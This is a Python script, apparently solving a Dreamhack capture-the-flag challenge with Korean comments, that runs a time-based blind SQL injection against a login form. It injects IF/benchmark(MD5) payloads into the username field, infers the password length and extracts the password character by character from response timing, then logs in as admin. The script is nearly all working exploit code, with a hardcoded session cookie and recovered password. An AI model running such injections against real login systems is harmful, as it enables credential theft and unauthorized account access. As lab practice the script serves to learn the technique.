import requests
import time

# 요청할 URL
url = 'http://host3.dreamhack.games:18465/login'
# 전송할 데이터
data = {
    'username': 'admin',
    'password': 'value2'
}

# 전송할 쿠키
cookies = {
    'session': 'eyJpZCI6eyIgYiI6IjJUOFZvd3NQUWV4cHJBYStnTTlYNkE9PSJ9LCJ0cmllcyI6MH0.Zs29Ew.28OPSdxRoSpUQmQDWGP-kzQoCtE'
}

start_time = time.time()
# POST 요청 보내기
response = requests.post(url, data=data, cookies=cookies)

end_time = time.time()

gap = end_time - start_time

print(gap)


data = {
    'username': '\'or IF(length(password)=31, benchmark(10000000, MD5(\'test\')), 0) #',
    'password': 'value2'
}

start_time = time.time()
# POST 요청 보내기
response = requests.post(url, data=data, cookies=cookies)

end_time = time.time()

gap = end_time - start_time

print(gap)

payload = '\'or IF(ascii(substr(password,1,1))=, benchmark(10000000, MD5(\'test\')), 0) #'
payload = "'or IF(ascii(substr(password,1,1))=32, benchmark(1000000, MD5('test')), 0) #"
password = ""
# for i in range(1, 32):  # 비밀번호 길이 가정 (20자로 가정)

for i in range(33, 33):
    print("i :",i)
    for char in range(32, 127):  # ASCII 범위
        payload = "'or IF(ascii(substr(password,"+str(i)+",1))="+str(char)+", benchmark(10000000, MD5('test')), 0) #"
        #print(payload)
        start_time = time.time()
        data = {
            'username': payload,
            'password': 'value2'
        }
        response = requests.post(url, data=data, cookies=cookies)
        end_time = time.time()
        elapsed_time = end_time - start_time
        if elapsed_time > 1.5:  # 5초 대기 확인
            password += chr(char)
            print(f"현재 비밀번호: {password}")
            break

data = {
    'username': 'admin',
    'password': password
}
data = {
    'username': 'admin',
    'password': "OTVXOGg4YnNWRFJyNE9FcWRIUXg3UT09"
}
response = requests.post(url, data=data, cookies=cookies)
print(response.text)